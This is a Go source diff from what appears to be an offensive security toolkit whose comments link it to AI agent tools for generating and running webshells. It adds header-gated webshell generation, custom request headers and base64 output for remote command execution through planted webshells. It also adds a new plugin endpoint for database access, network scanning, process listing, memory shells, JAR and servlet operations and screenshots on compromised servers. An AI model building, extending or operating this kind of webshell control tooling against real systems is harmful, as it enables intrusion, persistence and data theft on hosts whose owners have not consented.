@@ -6,6 +6,7 @@ package server
 // 与 agent 工具 webshell_gen/webshell_exec 同一内核，这里给工具箱 UI 用。
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"net/http"
 	"os"
@@ -23,6 +24,8 @@ func (s *Server) webshellGenerateAPI(w http.ResponseWriter, r *http.Request) {
 		Encoder    string `json:"encoder"`
 		Password   string `json:"password"`
 		Filename   string `json:"filename"`
+		GateHeader string `json:"gate_header"`
+		GateValue  string `json:"gate_value"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
 		writeErr(w, 400, "bad json: "+err.Error())
@@ -35,7 +38,9 @@ func (s *Server) webshellGenerateAPI(w http.ResponseWriter, r *http.Request) {
 	if b.Encoder == "" {
 		b.Encoder = "raw"
 	}
-	code, err := webshell.GenerateShell(b.ScriptType, b.Encoder, b.Password)
+	code, err := webshell.GenerateShellOpts(b.ScriptType, b.Encoder, b.Password, webshell.GateOpts{
+		Header: b.GateHeader, Value: b.GateValue,
+	})
 	if err != nil {
 		writeErr(w, 400, err.Error())
 		return
@@ -72,6 +77,7 @@ func (s *Server) webshellExecAPI(w http.ResponseWriter, r *http.Request) {
 		ContentB64 string `json:"content_b64"`
 		Cwd        string `json:"cwd"`
 		Timeout    int    `json:"timeout"`
+		Headers    string `json:"headers"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
 		writeErr(w, 400, "bad json: "+err.Error())
@@ -97,9 +103,12 @@ func (s *Server) webshellExecAPI(w http.ResponseWriter, r *http.Request) {
 		URL: b.URL, Password: b.Password, Encoder: b.Encoder, ScriptType: b.ScriptType,
 		Cwd: b.Cwd, Timeout: time.Duration(b.Timeout) * time.Second,
 	}
-	ctx := r.Context()
-	// 同步执行（UI 单发单收，超时上限 120s）
-	_ = ctx
+	if b.Headers != "" {
+		var hs map[string]string
+		if json.Unmarshal([]byte(b.Headers), &hs) == nil {
+			cli.ExtraHeaders = hs
+		}
+	}
 	res, err := cli.RoundTrip(b.Op, webshell.P{
 		Cmd: b.Cmd, Cwd: b.Cwd, Path: b.Path, Content: b.Content, B64Data: b.ContentB64,
 	})
@@ -109,6 +118,57 @@ func (s *Server) webshellExecAPI(w http.ResponseWriter, r *http.Request) {
 	}
 	writeJSON(w, 200, map[string]any{"data": map[string]any{
 		"ok": res.OK, "output": res.Output, "cwd": res.CWD, "error": res.Error,
-		"data_len": len(res.Data),
+		"data_len": len(res.Data), "data_b64": base64Encode(res.Data),
 	}})
+}
+
+// POST /api/tools/webshell/ext — 插件操作（db/netscan/proc/zip/memshell/servlet/jar/screenshot/php工具）。
+func (s *Server) webshellExtAPI(w http.ResponseWriter, r *http.Request) {
+	var b struct {
+		URL        string `json:"url"`
+		Password   string `json:"password"`
+		Encoder    string `json:"encoder"`
+		ScriptType string `json:"script_type"`
+		Op         string `json:"op"`
+		Headers    string `json:"headers"`
+		Timeout    int    `json:"timeout"`
+		Ext        webshell.ExtParams
+	}
+	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
+		writeErr(w, 400, "bad json: "+err.Error())
+		return
+	}
+	if strings.TrimSpace(b.URL) == "" || strings.TrimSpace(b.Password) == "" {
+		writeErr(w, 400, "url 与 password 必填")
+		return
+	}
+	if b.Timeout <= 0 || b.Timeout > 180 {
+		b.Timeout = 60
+	}
+	cli := &webshell.Client{
+		URL: b.URL, Password: b.Password, Encoder: b.Encoder, ScriptType: b.ScriptType,
+		Timeout: time.Duration(b.Timeout) * time.Second,
+	}
+	if b.Headers != "" {
+		var hs map[string]string
+		if json.Unmarshal([]byte(b.Headers), &hs) == nil {
+			cli.ExtraHeaders = hs
+		}
+	}
+	res, err := cli.RoundTripExt(b.Op, b.Ext)
+	if err != nil {
+		writeErr(w, 502, "插件执行失败: "+err.Error())
+		return
+	}
+	writeJSON(w, 200, map[string]any{"data": map[string]any{
+		"ok": res.OK, "output": res.Output, "error": res.Error,
+		"data_len": len(res.Data), "data_b64": base64Encode(res.Data),
+	}})
+}
+
+func base64Encode(b []byte) string {
+	if len(b) == 0 {
+		return ""
+	}
+	return base64.StdEncoding.EncodeToString(b)
 }
